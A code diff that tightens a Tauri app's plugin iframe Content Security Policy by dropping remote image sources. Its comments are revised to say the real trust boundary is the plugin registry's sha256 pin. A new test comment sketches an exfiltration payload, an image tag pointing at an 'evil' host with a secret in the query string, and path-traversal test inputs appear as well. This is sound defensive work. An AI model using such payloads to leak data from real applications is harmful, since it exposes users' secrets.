@@ -3,8 +3,10 @@
 
 //! The `mdplugin` URI scheme: serves an installed plugin's files to its iframe.
 //!
-//! Every response carries a CSP that forbids network access, so the plugin's
-//! only way out is the host RPC. `Access-Control-Allow-Origin: *` is required
+//! Every response carries a CSP that forbids fetch, XHR, WebSockets and remote
+//! images, so a plugin's sanctioned way out is the host RPC. This stops casual
+//! leaks, not a hostile plugin: a sandboxed frame can still navigate itself to
+//! any URL. The real trust boundary is the curated registry and its sha256 pin. `Access-Control-Allow-Origin: *` is required
 //! because the sandboxed frame has an opaque origin and Vite emits module
 //! scripts, which are fetched in CORS mode.
 
@@ -15,7 +17,7 @@ use tauri::http::{header, Response, StatusCode};
 use super::manifest::{safe_relative, valid_id};
 use super::store::{plugin_dir, read_installed};
 
-pub const PLUGIN_CSP: &str = "default-src 'none'; script-src mdplugin: http://mdplugin.localhost; style-src mdplugin: http://mdplugin.localhost 'unsafe-inline'; img-src mdplugin: http://mdplugin.localhost data: https:; font-src mdplugin: http://mdplugin.localhost data:; connect-src 'none'; form-action 'none'";
+pub const PLUGIN_CSP: &str = "default-src 'none'; script-src mdplugin: http://mdplugin.localhost; style-src mdplugin: http://mdplugin.localhost 'unsafe-inline'; img-src mdplugin: http://mdplugin.localhost data:; font-src mdplugin: http://mdplugin.localhost data:; connect-src 'none'; form-action 'none'";
 
 pub fn resolve(root: &Path, uri_path: &str) -> Option<PathBuf> {
     let path = uri_path.strip_prefix('/')?;
@@ -110,6 +112,14 @@ mod tests {
         assert!(resolve(root.path(), "/linear/index.html").is_none());
         assert!(resolve(root.path(), "/../secret.txt").is_none());
         assert!(resolve(root.path(), "/jira/missing.js").is_none());
+    }
+
+    #[test]
+    fn csp_allows_no_remote_sources() {
+        // An <img src="https://evil/?t=…"> would carry a secret to any host,
+        // past the http permission list.
+        assert!(!PLUGIN_CSP.contains("https:"));
+        assert!(PLUGIN_CSP.contains("connect-src 'none'"));
     }
 
     #[test]
